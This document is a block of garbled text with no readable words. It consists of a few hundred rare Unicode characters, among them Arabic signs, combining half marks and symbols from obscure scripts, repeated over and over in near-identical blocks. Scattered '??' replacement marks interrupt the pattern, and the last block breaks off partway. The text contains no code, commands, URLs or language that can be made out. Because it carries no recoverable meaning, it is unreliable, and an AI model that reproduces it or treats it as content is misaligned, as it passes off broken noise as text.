𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬??࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙𞋬𞋬??࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬??؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬